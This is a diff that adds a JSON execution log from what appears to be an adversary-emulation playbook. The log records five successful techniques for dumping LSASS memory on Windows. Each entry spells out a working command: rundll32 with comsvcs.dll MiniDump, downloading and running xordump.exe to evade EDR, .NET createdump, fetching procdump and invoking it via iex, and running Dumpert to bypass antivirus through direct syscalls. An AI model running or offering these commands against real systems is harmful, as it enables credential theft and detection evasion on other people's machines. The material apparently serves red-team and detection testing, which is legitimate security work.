@@ -1,0 +1,83 @@
+{
+  "playbookName": "five_abilities_no_noise",
+  "startedAt": 1781567434530,
+  "finishedAt": 1781567502963,
+  "timeline": [
+    {
+      "index": 0,
+      "id": "35d92515122effdd73801c6ac3021da7",
+      "name": "Dump LSASS.exe Memory using comsvcs.dll",
+      "description": "The memory of lsass.exe is often dumped for offline credential theft attacks. This can be achieved with a built-in dll.\n\nUpon successful execution, you should see the following file created $env:TEMP\\lsass-comsvcs.dmp.\n",
+      "command": "C:\\Windows\\System32\\rundll32.exe C:\\windows\\System32\\comsvcs.dll, MiniDump (Get-Process lsass).id $env:TEMP\\lsass-comsvcs.dmp full",
+      "taskName": "SDRSVC",
+      "type": "ability",
+      "repeatIndex": null,
+      "startedAt": 1781567444302,
+      "finishedAt": 1781567453423,
+      "durationMs": 9121,
+      "status": "success",
+      "error": null
+    },
+    {
+      "index": 1,
+      "id": "36fc42ced381416ca7d5d7af0ee0561b",
+      "name": "Dump LSASS.exe using imported Microsoft DLLs",
+      "description": "The memory of lsass.exe is often dumped for offline credential theft attacks. This can be achieved by\nimporting built-in DLLs and calling exported functions. Xordump will re-read the resulting minidump \nfile and delete it immediately to avoid brittle EDR detections that signature lsass minidump files.\n\nUpon successful execution, you should see the following file created $env:TEMP\\lsass-xordump.t1003.001.dmp.\n",
+      "command": "if (Test-Path 'C:\\Windows\\Temp\\xordump.exe') { ; } else {[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; Invoke-WebRequest \"https://github.com/audibleblink/xordump/releases/download/v0.0.1/xordump.exe\" -OutFile C:\\Windows\\Temp\\xordump.exe};  ;  C:\\Windows\\Temp\\xordump.exe -out C:\\Windows\\Temp\\lsass-xordump.t1003.001.dmp -x 0x41",
+      "taskName": "NcaSvc",
+      "type": "ability",
+      "repeatIndex": null,
+      "startedAt": 1781567454425,
+      "finishedAt": 1781567463310,
+      "durationMs": 8885,
+      "status": "success",
+      "error": null
+    },
+    {
+      "index": 2,
+      "id": "8e01631039faf6a9a84df376bf9ad0f1",
+      "name": "Dump LSASS with createdump.exe from .Net v5",
+      "description": "Use createdump executable from .NET to create an LSASS dump.\n\n[Reference](https://twitter.com/bopin2020/status/1366400799199272960?s=20)\n",
+      "command": "$exePath =  resolve-path \"$env:ProgramFiles\\dotnet\\shared\\Microsoft.NETCore.App\\5*\\createdump.exe\"; & \"$exePath\" -u -f $env:Temp\\dotnet-lsass.dmp (Get-Process lsass).id",
+      "taskName": "Appinfo",
+      "type": "ability",
+      "repeatIndex": null,
+      "startedAt": 1781567464311,
+      "finishedAt": 1781567472092,
+      "durationMs": 7781,
+      "status": "success",
+      "error": null
+    },
+    {
+      "index": 3,
+      "id": "0ef4cc7b-611c-4237-b20b-db36b6906554",
+      "name": "Leverage Procdump for lsass memory",
+      "description": "Dump lsass for later use with mimikatz",
+      "command": "$ps_url = \"https://download.sysinternals.com/files/Procdump.zip\";\n$download_folder = \"C:\\Users\\Public\\\";\n$staging_folder = \"C:\\Users\\Public\\temp\";\nStart-BitsTransfer -Source $ps_url -Destination $download_folder;\nExpand-Archive -LiteralPath $download_folder\"Procdump.zip\" -DestinationPath $staging_folder;\n$arch=[System.Environment]::Is64BitOperatingSystem;\n\nif ($arch) {\n    iex $staging_folder\"\\procdump64.exe -accepteula -ma lsass.exe\" > $env:APPDATA\\error.dmp 2>&1;\n} else {\n    iex $staging_folder\"\\procdump.exe -accepteula -ma lsass.exe\" > $env:APPDATA\\error.dmp 2>&1;\n}\nremove-item $staging_folder -Recurse;",
+      "taskName": "WinRM",
+      "type": "ability",
+      "repeatIndex": null,
+      "startedAt": 1781567473093,
+      "finishedAt": 1781567480296,
+      "durationMs": 7203,
+      "status": "success",
+      "error": null
+    },
+    {
+      "index": 4,
+      "id": "03455985e8bf5d2ee43947cadaca2256",
+      "name": "Dump LSASS.exe Memory using direct system calls and API unhooking",
+      "description": "The memory of lsass.exe is often dumped for offline credential theft attacks. This can be achieved using direct system calls and API unhooking in an effort to avoid detection. \nhttps://github.com/outflanknl/Dumpert\nhttps://outflank.nl/blog/2019/06/19/red-team-tactics-combining-direct-system-calls-and-srdi-to-bypass-av-edr/\nUpon successful execution, you should see the following file created C:\\\\windows\\\\temp\\\\dumpert.dmp.\n\nIf you see a message saying \\\"The system cannot find the path specified.\\\", try using the  get-prereq_commands to download the  tool first.\n",
+      "command": "\"C:\\Users\\Public\\Outflank-Dumpert.exe\"",
+      "taskName": "HvHost",
+      "type": "ability",
+      "repeatIndex": null,
+      "startedAt": 1781567481298,
+      "finishedAt": 1781567488658,
+      "durationMs": 7360,
+      "status": "success",
+      "error": null
+    }
+  ],
+  "backgroundEvents": []
+}
